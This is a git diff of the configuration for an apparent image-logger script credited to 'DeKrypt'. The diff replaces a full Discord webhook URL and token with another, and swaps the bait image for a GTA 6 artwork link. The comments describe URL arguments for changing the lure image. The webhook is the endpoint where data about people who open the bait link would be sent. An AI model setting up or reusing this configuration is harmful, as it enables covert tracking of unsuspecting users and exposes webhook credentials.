@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1544050176627572840/Gm_1ABJOLcd1vHCpwfCq2vzFaZHzuExFuukJzbw_TYIiUbFWYl1oQAixedRceeEzJ8AH",
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=AUwwOG0b&id=7AE107FAE49EB44785474408CA3AB10E23AC6CBB&thid=OIP.AUwwOG0bLJWfTW507pn-WgHaEK&mediaurl=https%3a%2f%2fwww.gtabase.com%2figallery%2fgta-6-artworks%2fjasonandlucia-02-withlogos-1600.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.014c30386d1b2c959f4d6e74ee99fe5a%3frik%3du2ysIw6xOsoIRA%26pid%3dImgRaw%26r%3d0&exph=1440&expw=2560&q=image+gta6&FORM=IRPRST&ck=F4E05910E3DB07F5ACE1F15DF71F702B&selectedIndex=0&itb=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
